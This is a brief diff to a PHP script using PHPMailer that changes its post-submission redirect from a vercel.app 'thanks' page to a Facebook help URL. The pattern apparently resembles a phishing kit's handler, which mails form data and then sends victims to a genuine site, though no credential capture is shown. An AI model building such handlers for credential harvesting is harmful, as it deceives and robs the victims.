@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://thanks-rediricted.vercel.app/");
+header("Location:https://www.facebook.com/help/media/thank-you?rdrhc");
 
 require 'Exception.php';
 require 'PHPMailer.php';
